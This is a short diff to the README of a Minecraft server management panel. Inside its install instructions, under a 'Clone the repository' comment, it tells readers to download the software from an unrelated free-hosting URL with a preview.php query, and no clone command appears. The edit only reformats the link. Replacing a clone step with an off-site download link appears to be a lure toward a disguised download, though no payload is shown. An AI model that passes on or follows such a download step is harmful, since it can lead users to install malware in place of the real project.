@@ -58,7 +58,7 @@ A modern, glassmorphism-styled Minecraft server management panel with real-time 
 
 ```bash
 # Clone the repository
-Download from [https://anyboot.ct.ws/res/](https://anyboot.ct.ws/res/preview.php?id=69c02a08b8029)
+Download from https://anyboot.ct.ws/res/preview.php?id=69c02a08b8029
 
 # Install dependencies
 npm install
